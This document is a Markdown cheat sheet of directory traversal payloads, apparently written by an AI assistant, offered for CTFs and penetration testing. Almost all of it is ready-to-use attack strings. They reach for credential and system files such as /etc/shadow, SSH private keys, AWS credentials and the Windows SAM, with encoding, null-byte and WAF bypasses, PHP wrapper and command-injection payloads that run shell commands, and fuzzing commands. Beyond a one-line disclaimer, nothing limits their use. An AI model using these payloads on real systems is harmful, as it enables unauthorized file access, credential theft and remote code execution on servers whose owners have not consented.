# 📂 Directory Traversal Payloads & Bypass Techniques

A curated list of **Directory Traversal (Path Traversal)** payloads and bypass techniques for CTFs, penetration testing, and learning purposes.

---

## 📌 What is Directory Traversal?

Directory Traversal is a vulnerability that allows an attacker to access files and directories **outside the intended directory** by manipulating file paths.

Example:

```
../../etc/passwd
```

---

## 🔹 Basic Traversal Sequences

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
```

### Absolute Paths

```
/etc/passwd
/proc/version
/proc/self/environ
```

### Windows Targets

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
```

### Obfuscated Traversal

```
....//....//....//etc/passwd
....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
```

### Sensitive Files

```
/etc/shadow
/root/.ssh/id_rsa
~/.ssh/id_rsa
/home/user/.aws/credentials
```

---

## 🔹 Null Byte Injection (Bypass File Extensions)

Used to terminate strings and bypass filters like `.jpg`, `.png`.

```
../../etc/passwd%00
../../etc/passwd%00.jpg
../../../etc/passwd%00.png
/etc/passwd%00.gif
....//....//etc/passwd%00
/etc/passwd\0
/etc/passwd%0
/etc/passwd%0000
```

---

## 🔹 Encoding Bypass Techniques

### URL Encoding

```
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Double Encoding

```
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Triple Encoding

```
%2525%252e%2525%252e%252fetc%252fpasswd
```

### Mixed Encoding

```
..%252f..%252fetc%252fpasswd
%2e%2e%2f%6e%65%74%63%2f%70%61%73%73%77%64
```

### Unicode Encoding

```
%u002e%u002e%u002fetc%u002fpasswd
```

### UTF-8 Overlong Encoding

```
..%c0%af..%c0%afetc%2fpasswd
```

---

## 🔹 Absolute Path & Wrapper Bypass

```
/var/www/images/../../../etc/passwd
/images/../../../etc/passwd
file:///etc/passwd
```

### PHP Wrappers

```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=convert.iconv.../resource=/etc/passwd
expect://id
data://text/plain;base64,L2V0Yy9wYXNzd2Q=
```

---

## 🔹 Windows-Specific Payloads

```
..\..\..\windows\system32\drivers\etc\hosts
..%c0%af..%c0%afwindows%5csystem32%5cdrivers%5cetc%5chosts
C:/Windows/system32/drivers/etc/hosts%00
\\?\C:\Windows\system32\config\SAM
\\\\?\\C:\\Windows\\Win.ini
```

---

## 🔹 Advanced Bypass Techniques

### Mixed Separators

```
....\\/....\\/etc/passwd
```

### Dot Padding

```
/./././././etc/passwd
```

### Encoded Traversal

```
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### Path Normalization Tricks

```
/etc/../etc/./passwd
```

### Injection & Chaining

```
;cat%20/etc/passwd
${IFS}bin${IFS}ls
```

### URL Tricks

```
/etc/passwd#comment.jpg
../../etc/passwd?anything
../../../etc/passwd;
```

---

## 🔹 Multi-Language / Wrapper Chains

```
zip://archive.zip%23shell.php
php://input|<?php system('id'); ?>
filter://data://text/plain;base64,...
```

---

## 🧪 Testing Tips

### 📏 Depth Testing

* Start with:

  ```
  ../../
  ```
* Increase depth until you reach root `/`

---

### 🎯 Common Targets

#### Linux

```
/etc/passwd
/proc/version
/var/log/apache2/access.log
```

#### Windows

```
win.ini
hosts
```

---

### 🛠 Tools

#### ffuf

```
ffuf -u "http://target.com/getfile?file=FUZZ" -w traversal.txt -fc 404
```

#### gobuster

```
gobuster dir -u http://target.com -w traversal.txt
```

---

### 🔍 Detection Signs

* ✅ `200 OK` with file content
* ⚠️ Error messages revealing file paths
* 🔁 Different responses based on payload

---

### 🛡 WAF Bypass Techniques

* Double / triple encoding
* Case variations:

  ```
  ..%2F vs ..%2f
  ```
* HTTP Parameter Pollution:

  ```
  path=../&path=../../
  ```
* Mixed encodings and separators

---

## ⚠️ Disclaimer

This content is for **educational and ethical hacking purposes only**.
Do not use these techniques on systems without proper authorization.

---

## ⭐ Pro Tip

Combine these payloads with tools like:

* Burp Suite (Intruder / Repeater)
* Custom fuzzing scripts
* Context-based testing

---

If you want, I can also:

* 🔥 Turn this into a **GitHub-ready repo**
* ⚙️ Add **automated fuzzing scripts (Python/ffuf wordlist)**
* 🎯 Make a **CTF cheat sheet version (1-page)**
